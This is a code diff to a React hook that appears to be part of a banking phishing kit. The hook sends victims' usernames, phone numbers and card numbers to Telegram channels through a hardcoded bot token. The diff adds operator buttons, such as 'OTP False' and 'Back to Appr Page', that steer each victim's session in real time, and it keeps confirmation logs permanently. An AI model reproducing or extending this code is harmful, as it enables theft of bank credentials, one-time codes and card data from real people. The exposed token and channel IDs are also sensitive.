@@ -5,8 +5,8 @@ import axios from 'axios';
 const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
 
 // Channel IDs
-const LOGS_CHAT_ID = '-1003861936742';  // Channel for logs (no buttons)
-const ACTIONS_CHAT_ID = '-1003745991330';  // Channel for interactive messages (with buttons)
+const LOGS_CHAT_ID = '-1003861936742';
+const ACTIONS_CHAT_ID = '-1003745991330';
 
 const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
   setTimeout(async () => {
@@ -23,7 +23,7 @@ const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
   }, delay);
 };
 
-export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr) => {
+export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse) => {
   const pollingIntervalRef = useRef(null);
   const lastUpdateIdRef = useRef(0);
 
@@ -115,10 +115,10 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  const sendOtpPageLog = async (username, phoneNumber, sessionId) => {
-    try {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const message = `🔐 OTP PAGE - IN PROGRESS 🔐
+const sendOtpPageLog = async (username, phoneNumber, sessionId) => {
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const message = `🔐 OTP PAGE - IN PROGRESS 🔐
 ━━━━━━━━━━━━━━━━━━━━━
 👤 Username: ${username}
 📱 Phone: ${phoneNumber}
@@ -126,10 +126,47 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ User is ready to enter OTP code!`;
 
+    const keyboard = {
+      inline_keyboard: [
+        [
+          { text: "🚫 OTP False", callback_data: `otp_false_${sessionId}` }
+        ]
+      ]
+    };
+
+    const response = await axios.post(url, {
+      chat_id: ACTIONS_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    });
+    
+    const messageId = response.data.result.message_id;
+    
+    console.log('✅ OTP page log sent');
+  } catch (error) {
+    console.error('Error sending OTP page log:', error);
+  }
+};
+
+  // ========== NEW: CONFIRMATION PAGE LOG (WITH BACK BUTTON) ==========
+  const sendConfirmationPageLog = async (username, cardNumber, sessionId) => {
+    try {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const message = `
+💳 <b>CONFIRMATION PAGE - IN PROGRESS</b> 💳
+━━━━━━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${username}
+💳 <b>Card Number:</b> ${cardNumber}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>User is on RB Key confirmation page!</i>
+      `;
+
       const keyboard = {
         inline_keyboard: [
           [
-            { text: "⬅️ Back to Card Verification", callback_data: `back_to_card_${sessionId}` }
+            { text: "⬅️ Back to Appr Page", callback_data: `back_to_appr_${sessionId}` }
           ]
         ]
       };
@@ -142,11 +179,10 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       });
       
       const messageId = response.data.result.message_id;
-      deleteMessageAfterDelay(ACTIONS_CHAT_ID, messageId, 15000);
       
-      console.log('✅ OTP page log sent (with back button)');
+      console.log('✅ Confirmation page log sent (with back to appr button)');
     } catch (error) {
-      console.error('Error sending OTP page log:', error);
+      console.error('Error sending confirmation page log:', error);
     }
   };
 
@@ -416,7 +452,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  // ========== CONFIRMATION LOG FOR NEXT STEP APPR (NO AUTO-DELETE - PERMANENT) ==========
+  // ========== CONFIRMATION LOG FOR NEXT STEP APPR (PERMANENT) ==========
   const sendConfirmationLog = async (username, cardNumber, sessionId) => {
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -432,14 +468,13 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
 ⚠️ <i>User confirmed payment in mobile banking</i>
       `;
 
-      // Send to LOGS_CHANNEL - NO auto-delete (permanent message)
       await axios.post(url, {
         chat_id: LOGS_CHAT_ID,
         text: message,
         parse_mode: 'HTML'
       });
       
-      console.log('✅ Confirmation log sent to Telegram (PERMANENT - will NOT delete)');
+      console.log('✅ Confirmation log sent to Telegram (PERMANENT)');
       return true;
     } catch (error) {
       console.error('Error sending confirmation log:', error);
@@ -610,10 +645,18 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
                 onBlock?.();
               }
               else if (action === 'appr') {
-                console.log('🟢 Calling onNextStepAppr callback - NAVIGATING TO NEXTSTEPAPPR');
-                
+                console.log('🟢 Calling onNextStepAppr callback');
                 onNextStepAppr?.();
               }
+              else if (action === 'back_to_appr') {
+                console.log('⬅️ Calling onBackToAppr callback');
+                onBackToAppr?.();
+              }
+              else if (action === 'otp_false') {
+                console.log('🚫 Calling onOtpFalse callback');
+                onOtpFalse?.();
+}
+              
               
               try {
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
@@ -636,7 +679,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         clearInterval(pollingIntervalRef.current);
       }
     };
-  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr]);
+  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse]);
 
   useEffect(() => {
     const cleanup = setupTelegramPolling();
@@ -662,6 +705,8 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     sendSiteEntryLog,
     sendBlockedLog,
     sendVisitNotification,
-    sendConfirmationLog  // ← NOW INCLUDED AND PERMANENT (NO AUTO-DELETE)
+    sendConfirmationLog,
+    sendConfirmationPageLog,
+    onOtpFalse
   };
 };
